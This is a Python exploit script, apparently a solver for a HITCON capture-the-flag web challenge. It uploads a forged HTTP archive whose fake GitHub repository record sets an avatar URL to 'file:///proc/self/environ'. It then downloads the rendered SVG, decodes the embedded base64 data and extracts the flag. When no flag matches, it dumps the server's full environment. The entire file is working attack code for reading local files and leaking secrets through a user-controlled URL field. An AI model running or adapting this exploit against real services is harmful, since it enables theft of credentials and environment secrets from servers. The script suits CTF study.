#!/usr/bin/env python3
import argparse
import base64
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.request
import uuid


FLAG_PATTERNS = (
    re.compile(rb'HITCON\{[^}\x00\r\n]+\}'),
    re.compile(rb'FLAG=[^\x00\r\n]+'),
)


def get_github_token():
    token = os.environ.get('GH_TOKEN') or os.environ.get('GITHUB_TOKEN')
    if token:
        return token
    try:
        return subprocess.check_output(
            ['gh', 'auth', 'token'], text=True, stderr=subprocess.DEVNULL,
        ).strip()
    except (FileNotFoundError, subprocess.CalledProcessError):
        raise SystemExit('Set GH_TOKEN/GITHUB_TOKEN or log in with `gh auth login`.')


def request(url, *, method='GET', headers=None, body=None, timeout=20):
    req = urllib.request.Request(
        url, data=body, method=method, headers=headers or {},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.headers, response.read()
    except urllib.error.HTTPError as error:
        return error.code, error.headers, error.read()


def github_json(path, token):
    status, _, body = request(
        f'https://api.github.com{path}',
        headers={
            'Accept': 'application/vnd.github+json',
            'Authorization': f'Bearer {token}',
            'User-Agent': 'repo-cassette-solver',
            'X-GitHub-Api-Version': '2022-11-28',
        },
    )
    if status != 200:
        raise RuntimeError(f'GitHub API HTTP {status}: {body[:300]!r}')
    return json.loads(body)


def malicious_repository(repository):
    return json.dumps({
        'full_name': repository,
        'owner': {
            'login': 'cassette',
            'avatar_url': 'file:///proc/self/environ',
        },
        'description': 'Repo Cassette artifact',
        'stargazers_count': 0,
    }, separators=(',', ':')).encode()


def multipart(fields, filename, file_bytes):
    boundary = f'----repo-cassette-{uuid.uuid4().hex}'
    chunks = []
    for name, value in fields.items():
        chunks.append(
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f'{value}\r\n'.encode()
        )
    chunks.append(
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="capture"; filename="{filename}"\r\n'
        'Content-Type: application/json\r\n\r\n'.encode()
    )
    chunks.extend((file_bytes, f'\r\n--{boundary}--\r\n'.encode()))
    return f'multipart/form-data; boundary={boundary}', b''.join(chunks)


def create_fixture(base, repository, payload):
    har = json.dumps({
        'log': {'entries': [{
            'request': {'url': f'https://api.github.com/repos/{repository}'},
            'response': {
                'headers': [
                    {'name': 'Content-Type', 'value': 'application/json'},
                ],
                'content': {'text': payload.decode()},
            },
        }]},
    }, separators=(',', ':')).encode()
    content_type, body = multipart(
        {'repository': repository, 'entryIndex': '0'}, 'capture.har', har,
    )
    status, _, response = request(
        f'{base}/api/fixtures', method='POST',
        headers={'Content-Type': content_type}, body=body,
    )
    try:
        result = json.loads(response)
    except json.JSONDecodeError as error:
        raise RuntimeError(f'fixture HTTP {status}: {response[:300]!r}') from error
    if status != 201:
        raise RuntimeError(f'fixture HTTP {status}: {result}')
    return result


def extract_flag(svg):
    data_uris = re.findall(rb'data:[^;"\']+;base64,([A-Za-z0-9+/=]+)', svg)
    for encoded in data_uris:
        environ = base64.b64decode(encoded)
        for pattern in FLAG_PATTERNS:
            match = pattern.search(environ)
            if match:
                return match.group().decode(errors='replace'), environ
    return None, None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('base_url', help='e.g. http://repo-archive.chal.hitconctf.com:PORT')
    parser.add_argument('github_repo', help='private OWNER/REPO used to build artifacts')
    args = parser.parse_args()
    base = args.base_url.rstrip('/')

    listing = github_json(
        f'/repos/{args.github_repo}/actions/artifacts?per_page=100',
        get_github_token(),
    )
    artifacts = [
        item for item in listing.get('artifacts', [])
        if item.get('name', '').startswith('repo-cassette-')
        and not item.get('expired')
    ]
    if not artifacts:
        raise SystemExit('No candidate artifacts. Run the build workflow first.')

    failures = []
    for artifact in artifacts:
        artifact_id = artifact['id']
        repository = f'{args.github_repo}/actions/artifacts/{artifact_id}/zip'
        print(f'[*] trying {artifact["name"]} ({artifact_id})', flush=True)
        try:
            fixture = create_fixture(
                base, repository, malicious_repository(repository),
            )
        except Exception as error:
            failures.append((artifact_id, f'upload: {error}'))
            continue
        if not fixture.get('sourceSha256'):
            failures.append((artifact_id, 'sourceSha256 is null'))
            continue

        fixture_id = fixture['id']
        status, _, postcard_body = request(
            f'{base}/api/postcards/{fixture_id}',
        )
        if status != 200:
            failures.append((artifact_id, f'postcard HTTP {status}'))
            continue
        postcard = json.loads(postcard_body)
        if not postcard.get('verified'):
            failures.append((artifact_id, 'postcard was not verified'))
            continue

        status, _, svg = request(f'{base}{postcard["image"]}')
        if status != 200:
            failures.append((artifact_id, f'image HTTP {status}'))
            continue
        flag, environ = extract_flag(svg)
        if flag:
            print(f'[+] {flag}')
            return 0
        failures.append((artifact_id, 'verified, but no flag found'))
        if environ:
            print(environ.replace(b'\x00', b'\n').decode(errors='replace'))

    print('[-] all candidates failed:', file=sys.stderr)
    for artifact_id, reason in failures:
        print(f'    {artifact_id}: {reason}', file=sys.stderr)
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
